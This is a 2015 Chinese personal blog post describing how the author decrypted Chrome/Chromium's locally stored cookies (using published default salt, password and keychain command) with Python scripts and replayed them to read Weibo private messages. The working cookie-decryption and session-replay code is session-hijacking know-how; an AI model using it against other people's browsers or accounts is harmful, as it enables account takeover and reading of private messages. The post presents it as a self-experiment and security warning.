<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>利用cookie查看微博私信 | 坚强的鸡蛋</title>
  <meta name="author" content="Huaguan, Ma">
  
  <meta name="description" content="蛋爷的博客，攻城狮的窝，优雅的外在，科学的内心，互联网中的水吧，这里有一只坚强的鸡蛋！">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="利用cookie查看微博私信"/>
  <meta property="og:site_name" content="坚强的鸡蛋"/>

  
    <meta property="og:image" content="undefined"/>
  

  <link href="/favicon.png" rel="icon">
  <link rel="alternate" href="/atom.xml" title="坚强的鸡蛋" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  
<script>
  var _hmt = _hmt || [];
  (function() {
    var hm = document.createElement("script");
    hm.src = "//hm.baidu.com/hm.js?09c1001b947c5a5aa5e973344ae4b2e0";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
  })();
</script>

</head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">坚强的鸡蛋</a></h1>
  <h2><a href="/">Collect the dots in your life.</a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
      <li> <a href="/atom.xml">RSS</a> </li>
    
      <li><a href="/">首页</a></li>
    
      <li><a href="/archives">归档</a></li>
    
      <li><a href="/about">关于</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div>
</header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2015-02-27T15:15:00.000Z"><a href="/2015/02/27/cookie-hack/">2月 27 2015</a></time>
      
      
  
    <h1 class="title">利用cookie查看微博私信</h1>
  

    </header>
    <div class="entry">
      
        <p>记得还是在学Qt编程的时候，做过一个练手项目，产品是一个搜索Chrome的cookie内容的小软件。Chrome的cookie保存在用户目录的一个sqlite文件中，具体路径上网搜一下就知道了。当时比较天真，想看看cookie里面有没有明文保存的密码，结果当然是得到一堆乱码，最后就不了了之了。<br><a id="more"></a><br>直到前几天，我正在网上看一篇关于cookie的文章，忽然想起一件事情，我需要密码的原因无非是用来登录，我既然有了cookie直接发给服务器就可以了，又有什么必要了解cookie的内容？我顺手用chrome打开了微博私信查看下它的请求流程：<br><img src="http://thumbsnap.com/s/mwkbI50J.png" alt="cookie-request-flow"></p>
<p>貌似理论上没有什么问题，不过还是要做个试验验证一下，我准备尝试用python写个小程序模拟浏览器向微博服务器发起私信消息的页面请求。</p>
<p>当然首先还是让我的小伙伴给我发条私信：<br><img src="http://thumbsnap.com/i/Gtlt6d5Y.png" alt="cookie-message"></p>
<h2 id="具体实现">具体实现</h2>
<p>整个实验我简单的作了个概念图：<br><img src="http://thumbsnap.com/i/2nneEq3T.png" alt="cookie-flow"></p>
<p>实验主要分为以下几个步骤：</p>
<ul>
<li>从chrome的sqlite文件中提取cookie</li>
<li>模拟浏览器组装header</li>
<li>向服务器发起目标页面的请求</li>
</ul>
<h3 id="提取chrome的cookie信息">提取chrome的cookie信息</h3>
<p>chrome的cookie保存路径在三大操作系统Windows、Linux和OSX上都不尽相同，以linux为例，它的保存路径就是<code>～/.config/chromium/Default/Cookies</code>，我们先用sqlite3程序把这个文件载入进来看看：<br><img src="http://thumbsnap.com/i/uN4qraCk.png" alt="cookie-tables"><br>cookie信息都保存在表<code>cookies</code>中，但是才刚开始就出现了意想不到的问题：<br><img src="http://thumbsnap.com/i/KjNIWNZF.png" alt="cookie-values-problem"></p>
<p>表里面的值和记忆中的大部分都是一样的，唯独最重要的value一项，居然是空的，而在末尾倒是多了个<code>encrypted_value</code>項。谷歌了一下，了解到在chrome版本33之前，cookie都是直接存储的，在33+之后，谷歌开始对cookie的信息进行了加密。顺便感慨下时光飞逝，不知不觉又老了几个版本。chrome在windows上加密采用的是CryptUnprotectData函数，解密方法大家可以看<a href="http://www.ftium4.com/chrome-cookies-encrypted-value-python.html" target="_blank" rel="external">这里</a>。Linux和OSX上的加密方法相似，都采用的是AES(CBC)加密方法，了解密码学的都知道对这个数据进行解密至少需要好几个值，salt，key length，iv，password，iterations等等。不过不幸的是一位国外的网友n8henrie在浏览了chromium源码之后把这些值统统找到了，以下是他原话：</p>
<ul>
<li>salt is <code>b&#39;saltysalt&#39;</code></li>
<li>key length is <code>16</code></li>
<li><code>iv</code> is 16 bytes of space <code>b&#39; &#39; * 16</code></li>
<li>on <code>Mac OSX</code>:<br>  <code>password</code> is in keychain under <code>Chrome Safe Storage</code><br>  I use the excellent keyring package to get the password<br>  You could also use bash: <code>security find-generic-password -w -s &quot;Chrome Safe Storage&quot;</code><br>  number of iterations is <code>1003</code></li>
<li>on Linux:<br>  password is <code>peanuts</code><br>  number of iterations is <code>1</code></li>
</ul>
<p>顺便贴出他给出的源代码(可能是原作者的失误，在clean函数中忘记调用了ord函数，特此补上)：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python3</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</div><div class="line"></div><div class="line"><span class="comment"># Function to get rid of padding</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span><span class="params">(x)</span>:</span> </div><div class="line">    <span class="keyword">return</span> x[:-ord(x[-<span class="number">1</span>])].decode(<span class="string">'utf8'</span>)</div><div class="line"></div><div class="line"><span class="comment"># replace with your encrypted_value from sqlite3</span></div><div class="line">encrypted_value = ENCRYPTED_VALUE </div><div class="line"></div><div class="line"><span class="comment"># Trim off the 'v10' that Chrome/ium prepends</span></div><div class="line">encrypted_value = encrypted_value[<span class="number">3</span>:]</div><div class="line"></div><div class="line"><span class="comment"># Default values used by both Chrome and Chromium in OSX and Linux</span></div><div class="line">salt = <span class="string">b'saltysalt'</span></div><div class="line">iv = <span class="string">b' '</span> * <span class="number">16</span></div><div class="line">length = <span class="number">16</span></div><div class="line"></div><div class="line"><span class="comment"># On Mac, replace MY_PASS with your password from Keychain</span></div><div class="line"><span class="comment"># On Linux, replace MY_PASS with 'peanuts'</span></div><div class="line">my_pass = MY_PASS</div><div class="line">my_pass = my_pass.encode(<span class="string">'utf8'</span>)</div><div class="line"></div><div class="line"><span class="comment"># 1003 on Mac, 1 on Linux</span></div><div class="line">iterations = <span class="number">1003</span></div><div class="line"></div><div class="line">key = PBKDF2(my_pass, salt, length, iterations)</div><div class="line">cipher = AES.new(key, AES.MODE_CBC, IV=iv)</div><div class="line"></div><div class="line">decrypted = cipher.decrypt(encrypted_value)</div><div class="line">print(clean(decrypted))</div></pre></td></tr></table></figure>

<p>我稍微改了下源代码，对上图header里的cookie的第一項尝试进行解密：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span><span class="params">(x)</span>:</span> </div><div class="line">    <span class="keyword">return</span> x[:-ord(x[-<span class="number">1</span>])].decode(<span class="string">'utf8'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted_value)</span>:</span></div><div class="line">    encrypted_value = encrypted_value[<span class="number">3</span>:]</div><div class="line"></div><div class="line">    salt = <span class="string">b'saltysalt'</span></div><div class="line">    iv = <span class="string">b' '</span> * <span class="number">16</span></div><div class="line">    length = <span class="number">16</span></div><div class="line"></div><div class="line">    my_pass = <span class="string">'peanuts'</span></div><div class="line">    my_pass = my_pass.encode(<span class="string">'utf8'</span>)</div><div class="line"></div><div class="line">    iterations = <span class="number">1</span></div><div class="line"></div><div class="line">    key = PBKDF2(my_pass, salt, length, iterations)</div><div class="line">    cipher = AES.new(key, AES.MODE_CBC, IV=iv)</div><div class="line">    decrypted = cipher.decrypt(encrypted_value)</div><div class="line">    </div><div class="line">    <span class="keyword">return</span> clean(decrypted)</div><div class="line"></div><div class="line">cx = sqlite3.connect(os.path.expandvars(<span class="string">'$HOME'</span>) + <span class="string">'/.config/chromium/Default/Cookies'</span>)</div><div class="line">cu = cx.cursor()</div><div class="line"></div><div class="line">cu.execute(<span class="string">"select * from cookies where host_key = '.weibo.com' and name = 'SINAGLOBAL'"</span>)</div><div class="line">    </div><div class="line">res = cu.fetchone()</div><div class="line">    </div><div class="line"><span class="keyword">print</span> decrypt(res[len(res)-<span class="number">1</span>])</div></pre></td></tr></table></figure>

<p>结果显示n8henrie给出的值确实是正确的，解密成功。<br><img src="http://thumbsnap.com/i/CjKIZd6R.png" alt="cookie-value-chrome"><br><img src="http://thumbsnap.com/i/ZwerOWIt.png" alt="cookie-chomre"></p>
<p>这个值我们不知道有什么意义，因为本来就不需要，直接把它发给服务器就好，服务器自己知道怎么解密的。</p>
<p>cookie值解密出来之后，感觉就像是突然变成了宿管阿姨，手里握着整栋宿舍的钥匙。</p>
<h3 id="组装header">组装header</h3>
<p>组装header这里比较容易了，基本上照着上面截下来的Chrome的header照抄就好了，不过要注意的是记得把<code>Accept-Encoding:gzip，deflate，sdch</code>这一项去掉，不然返回的数据是经过压缩的，最后再加上解密出来的cookie，一个完整的header就出来了。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sqlite3</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line">cx = sqlite3.connect(os.path.expandvars(<span class="string">'$HOME'</span>) + <span class="string">'/.config/chromium/Default/Cookies'</span>)</div><div class="line">cu = cx.cursor()</div><div class="line">cu.execute(<span class="string">"select * from cookies where host_key = '.weibo.com'"</span>)</div><div class="line"></div><div class="line">cookies = <span class="string">''</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> res <span class="keyword">in</span> cu.fetchall(): </div><div class="line">    cookies += res[<span class="number">2</span>] + <span class="string">'='</span> + decrypt(res[len(res)-<span class="number">1</span>]) + <span class="string">'; '</span></div><div class="line"></div><div class="line">url = <span class="string">'http://weibo.com/messages'</span></div><div class="line"></div><div class="line">header = {</div><div class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</div><div class="line">        #<span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch'</span>,</div><div class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,zh-TW;q=0.2'</span>,</div><div class="line">        <span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</div><div class="line">        <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</div><div class="line">        <span class="string">'Host'</span>: <span class="string">'weibo.com'</span>,</div><div class="line">        <span class="string">'Cookie'</span>: cookies,</div><div class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/40.0.2214.111 Chrome/40.0.2214.111 Safari/537.36'</span></div><div class="line">}</div><div class="line">request = urllib2.Request(url, headers=header)</div></pre></td></tr></table></figure>

<h3 id="发送请求">发送请求</h3>
<p>最后一步发送请求，把返回的数据打开看一下，私信消息已经在里面了。<br><img src="http://thumbsnap.com/i/RhdHDij2.png" alt="cookie-msg-decode"></p>
<h2 id="结语">结语</h2>
<p>没想到整个过程还算是比较顺利的，而且还是在linux平台。随后我又在windows和OSX上进行了试验，windows的解密要更简单一点，而在OSX上获取<code>Chrome Safe Storage</code>的<code>password</code>的时候系统提醒需要获取授权，也就是说从目前来看只有苹果系挡住了这次攻击。不得不说cookie确实给我们带来了太多的便利，但是与此同时也牺牲了太多的安全性，网络发展到今天很多事情已经超出可控的范围，尤其是在中国这种软件氛围，谁知道各大软件产商有什么做不出来的，想要保护好自己，只能靠自己平时多长点心眼了。</p>
<h2 id="Q&amp;A">Q&amp;A</h2>
<ul>
<li>Q：为什么我直接用你的代码返回404？</li>
<li>A：你要先用chrome至少浏览一次私信，不然哪来的cookie。<br><br></li>
<li>Q：为什么选择微博私信做实验？</li>
<li>A：因为我知道你们用的是微信而不是私信。<br><br></li>
<li>Q：你是在本机运行的，劫持自己的信息可以，怎么劫持别人的信息？</li>
<li>A：一般人不行，但是软件产商可以。<br><br></li>
<li>Q：为什么每个用户只有一条私信？不可以看到所有的对话嘛？</li>
<li>A：可以，但这里只是做为实验，不可有小人之心，但不能不防小人<br><br></li>
<li>Q：有了cookie除了看私信还能干什么？</li>
<li>A：不知道。</li>
</ul>
<p>最后感谢下caixpp童鞋发了封私信，还有，用完数据库记得close。</p>
<h2 id="References">References</h2>
<ul>
<li><a href="http://stackoverflow.com/questions/23153159/decrypting-chrome-iums-cookies/23727331#23727331" target="_blank" rel="external">http://stackoverflow.com/questions/23153159/decrypting-chrome-iums-cookies/23727331#23727331</a></li>
<li><a href="http://n8henrie.com/2014/05/decrypt-chrome-cookies-with-python/" target="_blank" rel="external">http://n8henrie.com/2014/05/decrypt-chrome-cookies-with-python/</a></li>
<li><a href="http://www.ftium4.com/chrome-cookies-encrypted-value-python.html" target="_blank" rel="external">http://www.ftium4.com/chrome-cookies-encrypted-value-python.html</a></li>
</ul>
<h2 id="转载请注明">转载请注明</h2>
<p>原文地址： <a href="http://mafagan.sinaapp.com/2015/02/26/cookie-hack/" target="_blank" rel="external">http://mafagan.sinaapp.com/2015/02/26/cookie-hack/</a></p>

      
    </div>
    <footer>
      
        
  
  <div class="categories">
    <a href="/categories/coding/">coding</a>
  </div>

        
  
  <div class="tags">
    <a href="/tags/http/">http</a>, <a href="/tags/cookie/">cookie</a>, <a href="/tags/python/">python</a>, <a href="/tags/aes/">aes</a>, <a href="/tags/chrome/">chrome</a>
  </div>

        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



    <nav id="pagination" >
        
                
                    <a href="/2015/02/21/wechat-lishi/" class="alignright next" >下一页</a>
                        
                        <div class="clearfix"></div>
                        </nav>


    <section id="comment">
       <div class="ds-thread" data-thread-key="2015/02/27/cookie-hack/" data-title="利用cookie查看微博私信" data-url="http://danye.me/2015/02/27/cookie-hack/"></div>

        <script type="text/javascript">
        var duoshuoQuery = {short_name:"mafagan"};
    (function() {
     var ds = document.createElement('script');
     ds.type = 'text/javascript';ds.async = true;
     ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
     ds.charset = 'UTF-8';
     (document.getElementsByTagName('head')[0]
      || document.getElementsByTagName('body')[0]).appendChild(ds);
     })();
    </script>
    </section>


</div></div>
    <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="搜索">
    <input type="hidden" name="q" value="site:danye.me">
  </form>
</div>

  
<div class="widget tagcloud">
  <h3 class="title">标签云</h3>
  <div class="entry">
    <a href="/tags/C/" style="font-size: 20.00px;">C++</a><a href="/tags/STL/" style="font-size: 15.00px;">STL</a><a href="/tags/aes/" style="font-size: 10.00px;">aes</a><a href="/tags/algorithm/" style="font-size: 15.00px;">algorithm</a><a href="/tags/article/" style="font-size: 10.00px;">article</a><a href="/tags/buffer/" style="font-size: 10.00px;">buffer</a><a href="/tags/callback/" style="font-size: 10.00px;">callback</a><a href="/tags/chrome/" style="font-size: 10.00px;">chrome</a><a href="/tags/cookie/" style="font-size: 10.00px;">cookie</a><a href="/tags/http/" style="font-size: 10.00px;">http</a><a href="/tags/iterator/" style="font-size: 10.00px;">iterator</a><a href="/tags/libev/" style="font-size: 10.00px;">libev</a><a href="/tags/libevent/" style="font-size: 10.00px;">libevent</a><a href="/tags/linux/" style="font-size: 10.00px;">linux</a><a href="/tags/mutex/" style="font-size: 15.00px;">mutex</a><a href="/tags/nested-type/" style="font-size: 10.00px;">nested type</a><a href="/tags/nginx/" style="font-size: 15.00px;">nginx</a><a href="/tags/python/" style="font-size: 10.00px;">python</a><a href="/tags/signal/" style="font-size: 10.00px;">signal</a><a href="/tags/udp/" style="font-size: 10.00px;">udp</a><a href="/tags/unix/" style="font-size: 10.00px;">unix</a><a href="/tags/vim/" style="font-size: 10.00px;">vim</a><a href="/tags/微信/" style="font-size: 10.00px;">微信</a><a href="/tags/红包/" style="font-size: 10.00px;">红包</a>
  </div>
</div>


  
<div class="widget tag">
  <h3 class="title">最新文章</h3>
  <ul class="entry">
    
      <li>
        <a href="/2015/02/27/cookie-hack/">利用cookie查看微博私信</a>
      </li>
    
      <li>
        <a href="/2015/02/21/wechat-lishi/">微信红包算法探讨</a>
      </li>
    
      <li>
        <a href="/2015/02/17/nested-type/">《STL源码剖析》读书笔记(二)——typename与嵌套依赖类型</a>
      </li>
    
      <li>
        <a href="/2015/02/16/associated-types/">《STL源码剖析》读书笔记(一)——迭代器的相应类型</a>
      </li>
    
      <li>
        <a href="/2015/02/13/linux-udp-buffer/">linux中udp缓冲区大小的查看与设置</a>
      </li>
    
  </ul>
</div>

</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  
  &copy; 2015 Huaguan, Ma
  
</div>
<div class="clearfix"></div></footer>
  <script src="//lib.sinaapp.com/js/jquery/2.0.3/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>




<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>


</body>
</html>